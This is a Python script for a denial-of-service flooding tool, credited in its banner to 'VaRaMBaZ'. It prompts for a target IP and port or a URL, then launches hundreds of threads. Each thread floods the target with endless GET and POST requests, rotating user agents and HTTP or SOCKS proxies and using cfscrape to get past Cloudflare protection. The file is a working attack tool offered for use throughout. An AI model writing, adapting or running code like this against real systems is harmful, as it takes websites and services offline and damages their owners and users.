import colorama
import threading
import random
import requests
import cfscrape
import socket
import os

os.system("clear")

s = cfscrape.create_scraper()

with open('useragent') as file:
    headersp = ''.join(file.readlines()).strip().split('\n')

with open('proxyhttp') as file:
    proxy_http = ''.join(file.readlines()).strip().split('\n')

with open('proxysocks') as file:
    proxy_socks = ''.join(file.readlines()).strip().split('\n')

with open('fakeip') as file:
    fakeip_list = ''.join(file.readlines()).strip().split('\n')


def dosweb1(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}

        useragent2 = random.choice(headersp)
        header2 = {'user-agent': useragent2}

        proxyagenthttp = random.choice(proxy_http)
        proxieshttp = {
            'http': f'http://{proxyagenthttp}',
            'https': f'http://{proxyagenthttp}'
        }

        proxyagentsocks = random.choice(proxy_socks)
        proxiessocks = {
            'http': f'socks5://{proxyagentsocks}',
            'https': f'socks5://{proxyagentsocks}'
        }
        try:
            s.get(target, headers=header, proxies=proxieshttp)
            s.post(target, headers=header, proxies=proxieshttp)
            s.get(target, headers=header2, proxies=proxiessocks)
            s.post(target, headers=header2, proxies=proxiessocks)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[-] Connection error!")


def dosweb2(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}
        try:
            requests.get(target, headers=header)
            requests.post(target, headers=header)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[-] Connection error!")


def ddosip():
    while True:
        fake_ip = random.choice(fakeip_list)
        r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        r.connect((ip, port))
        r.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
        r.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
        r.close()

print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
print(" \\-\        //-/    //-/  \\-\     ||-|     ||-|   ||    |=-|  ||     |-| || _____|-|    ")
print("  \\-\      //-/    //-/    \\-\    ||-|     ||-|   ||    |=-|  ||     |-| ||____             ")
print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-|      || |-|    ")
print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
print("Creator: VaRaMBaZ")
print("Version: 1.6.3: TEST IP DDOS \n")

vibor = int(input("Attack for IP or Web [1-IP; 2-Web]: "))

if vibor == 1:
    ip = input("IP Target: ")
    port = int(input("Port: "))

    try:
        threads = int(input("Threads[max 500]: "))
    except ValueError:
        exit(colorama.Fore.RED + "Threads count is incorrect!")

    if threads > 500 or threads == 0:
        exit(colorama.Fore.RED + "Incorrect value")

    print(colorama.Fore.YELLOW + "Starting threads")
    for i in range(0, threads):
        threading.Thread(target=ddosip).start()
    print(colorama.Fore.GREEN + "All threads are running")
else:
    url = input("URL: ")

    try:
        threads = int(input("Threads[max 1000]: "))
    except ValueError:
        exit(colorama.Fore.RED + "Threads count is incorrect!")

    if threads > 1000:
        exit(colorama.Fore.RED + "Incorrect value")

    if threads == 0:
        exit(colorama.Fore.RED + "Threads count is incorrect!")

    if not url.__contains__("http"):
        exit(colorama.Fore.RED + "URL doesnt contains http or https!")

    if not url.__contains__("."):
        exit(colorama.Fore.RED + "Invalid domain")

    proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))

    print(colorama.Fore.YELLOW + "Starting threads")
    if proxyuseage == 1:
        for i in range(0, threads):
            threading.Thread(target=dosweb1, args=(url,)).start()
    else:
        for i in range(0, threads):
            threading.Thread(target=dosweb2, args=(url,)).start()
    print(colorama.Fore.GREEN + "All threads are running")
